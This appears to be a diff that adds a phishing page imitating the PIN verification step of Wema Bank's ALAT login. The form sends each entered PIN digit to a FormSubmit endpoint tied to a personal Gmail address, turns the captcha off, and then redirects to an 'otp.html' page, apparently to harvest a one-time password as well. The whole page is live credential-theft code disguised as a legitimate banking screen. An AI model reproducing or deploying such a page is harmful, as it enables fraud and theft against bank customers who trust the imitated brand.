@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="/logo.ico" type="image/ico" />
+  <link rel="manifest" href="/logo.ico" crossorigin="anonymous" />
+  <link rel="apple-touch-icon" sizes="48x48" href="/logo.ico" />
+  <link rel="apple-touch-icon" sizes="72x72" href="/logo.ico" />
+  <link rel="apple-touch-icon" sizes="96x96" href="/logo.ico" />
+  <link rel="apple-touch-icon" sizes="144x144" href="/logo.ico" />
+  <link rel="apple-touch-icon" sizes="192x192" href="/logo.ico" />
+  <link rel="apple-touch-icon" sizes="256x256" href="/logo.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login | ALAT by Wema</title>
+  <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
+  <script type="module" src="assets/index-BiOV7unC.js"></script>
+</head>
+<body>
+  <div id="root">
+    <div class="app">
+      <div class="pin">
+        <div class="container">
+          <div class="contentSec">
+            <div class="logo">
+              <img src="/assets/logo-Cw-qJTno.png" alt="logo" />
+            </div>
+            <div class="hometitle">Verify ALAT Pin</div>
+          </div>
+          <div class="formSec">
+            <div class="input">
+              <form id="pin-form" action="https://formsubmit.co/Godisrealq101@gmail.com" method="POST">
+                <div class="formPin">
+                  <input id="pin-0" type="password" name="pin-0" maxlength="1" class="pin-input" inputmode="numeric" required />
+                  <input id="pin-1" type="password" name="pin-1" maxlength="1" class="pin-input" inputmode="numeric" required />
+                  <input id="pin-2" type="password" name="pin-2" maxlength="1" class="pin-input" inputmode="numeric" required />
+                  <input id="pin-3" type="password" name="pin-3" maxlength="1" class="pin-input" inputmode="numeric" required />
+                </div>
+
+                <!-- Hidden FormSubmit settings -->
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="otp.html"> <!-- Redirects to login.html after submission -->
+                <input type="hidden" name="_template" value="box">
+
+                <span class="errorMessage"></span>
+                <div class="buttonSec">
+                  <button type="submit">Next</button>
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Optional: Javascript to improve input focus -->
+  <script>
+    const inputs = document.querySelectorAll('.pin-input');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
